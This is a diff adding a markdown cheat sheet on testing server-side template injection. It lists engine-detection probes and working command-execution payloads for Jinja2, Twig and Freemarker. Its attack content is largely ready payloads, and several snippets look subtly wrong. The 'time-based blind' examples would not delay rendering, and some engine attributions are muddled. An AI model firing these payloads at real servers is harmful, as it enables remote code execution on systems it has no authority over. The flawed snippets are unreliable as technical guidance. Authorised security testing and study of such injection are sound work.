@@ -1,0 +1,48 @@
+# HOW TO TEST SSTI ON A TARGET (2026 expert guide)
+> **Author:** MD MAHABUBUR RAHMAN
+Server-side template engine renders YOUR input as template code.
+
+## The N ways to test
+1. Probe the echo boundary: does "{{7*7}}" become 49 (Jinja/Twig/Nunjucks), "{7*7}"->49 (Freemarker),
+```
+   "{{7*'7'}}"->error/page change, "${7*7}", "#{7*7}", "<%= 7*7 %>".
+```
+2. Math probes per engine (see ssti-detection-2026.txt - the safe math table).
+3. Detect engine by error key (undef var, str_expr). Fingerprint with ssti-detection-common.
+4. Once engine known, chain to RCE via the match in ssti-to-rce-2026.txt.
+5. Blind (no output): time-based ({{7*7}} can't show) -> use in-template delay: Jinja
+   {% if ... %} , expression that sleeps the render (see blind-ssti-2026.txt).
+
+## Step-by-step on target
+1. List ready user-input echo spots: name field on page, size filter, error templates, emails, "last logged 12 {{x}}".
+2. Probe with the universal math: '{{7*7}}' then look at response body around it.
+3. Fingerprint engine from the Ops (Jinja vs Twig vs FreeMarker...).
+4. Turn on black-box automation (SSTImap) for the full chain, but verify each step manually.
+
+## Worked examples (concrete)
+Universal detection (order matters; some engines differ):
+{{7*7}}        -> 49 = Jinja2/Twig/Nunjucks/etc
+${7*7}         -> 49 = Freemarker / Thymeleaf (sub)
+{{7*'7'}}      -> 7777777 = Python string multiply (Jinja) ; error on Twig
+{7*7}         -> 49 (Freemarker alt; also Ruby Slim)
+<%= 7*7 %>     -> 49 (ERB)
+${7*7} ${7*7}  -> FreeMarker: 49 49 vs JSP EL 49
+Jinja2 -> RCE:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+The full chain list: SSTI/ssti-to-rce-2026.txt (Smarty, Twig, Pebble, Razor, Vry/Jinja).
+Twig -> RCE:
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+Freemarker -> RCE:
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+Time-based blind (Jinja):
+a{% if 'x'*0 %}b{% endif %}c     # 0 chars = no delay; then
+{% for x in range(3) %}{% if x==2 %}{% endif %}{% endfor %}
+detect-w-ready:  {{7*7}}  appears in <div> after rendering = confirm.
+
+## False positives
+- Input ends up in <b>{{yourname}}</b> raw but never a template engine = just stored-XSS, not SSTI.
+- Math probe that renders in JS interpolation ${...} = different (JS template literal) - that's XSS territory.
+
+## Tools
+- SSTImap (auto), tplmap (legacy), ffuf with detection file; manual chain per engine doc.
